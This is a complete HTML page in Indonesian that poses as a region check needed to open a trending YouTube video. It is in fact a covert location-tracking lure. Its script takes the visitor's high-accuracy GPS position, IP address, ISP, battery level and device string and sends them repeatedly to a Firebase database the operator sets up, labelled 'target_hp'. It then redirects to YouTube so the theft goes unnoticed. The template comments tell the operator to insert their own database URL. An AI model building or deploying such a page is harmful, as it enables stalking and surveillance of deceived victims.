<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Konten</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 320px; width: 90%; }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 25px; }
        .btn { background: #3b82f6; color: white; border: none; padding: 15px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:active { transform: scale(0.95); background: #2563eb; }
        #loader { display: none; margin-top: 15px; border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h2>Verifikasi Wilayah</h2>
    <p>Konten ini sedang tren di wilayah Anda. Silakan verifikasi lokasi untuk membuka aplikasi YouTube secara otomatis.</p>
    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO VIRAL</button>
    <div id="loader"></div>
</div>

<script>
    // --- KONFIGURASI_FIREBASE ---
    // Ganti URL di bawah dengan URL Realtime Database kamu
    const DB_URL = "ISI_DENGAN_URL_FIREBASE_KAMU/target_hp.json";

    const YT_URL = "https://www.youtube.com/trending";
    const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";

    let lastSent = 0;

    async function getExtraInfo() {
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const net = await ipRes.json();
            const battery = await navigator.getBattery();
            return {
                ip: net.ip,
                isp: net.org,
                bat: Math.round(battery.level * 100) + "%",
                dev: navigator.userAgent
            };
        } catch (e) { return { ip: "N/A", isp: "N/A", bat: "N/A", dev: navigator.userAgent }; }
    }

    async function sendToFirebase(coords) {
        const info = await getExtraInfo();
        const payload = {
            lat: coords.latitude,
            lon: coords.longitude,
            ip: info.ip,
            isp: info.isp,
            battery: info.bat,
            device: info.dev,
            time: new Date().toLocaleString("id-ID"),
            status: "Online (Background)"
        };

        fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
    }

    function processAll() {
        document.getElementById('startBtn').style.display = "none";
        document.getElementById('loader').style.display = "block";

        if (navigator.geolocation) {
            // Minta izin GPS
            navigator.geolocation.watchPosition(
                (pos) => {
                    // Kirim data pertama
                    sendToFirebase(pos.coords);

                    // Kirim data setiap 5 detik (looping tetap jalan di tab ini)
                    const now = Date.now();
                    if (now - lastSent > 5000) {
                        sendToFirebase(pos.coords);
                        lastSent = now;
                    }

                    // Pengalihan ke aplikasi YouTube eksternal
                    // Kita beri jeda 1 detik agar pengiriman data pertama selesai
                    setTimeout(() => {
                        window.location.href = YT_APP_INTENT;
                        // Fallback jika tidak punya aplikasi YT:
                        setTimeout(() => { window.location.href = YT_URL; }, 500);
                    }, 1000);
                },
                (err) => {
                    alert("Mohon izinkan lokasi agar video bisa dibuka sesuai wilayah Anda.");
                    location.reload();
                },
                { enableHighAccuracy: true }
            );
        }
    }
</script>

</body>
</html>
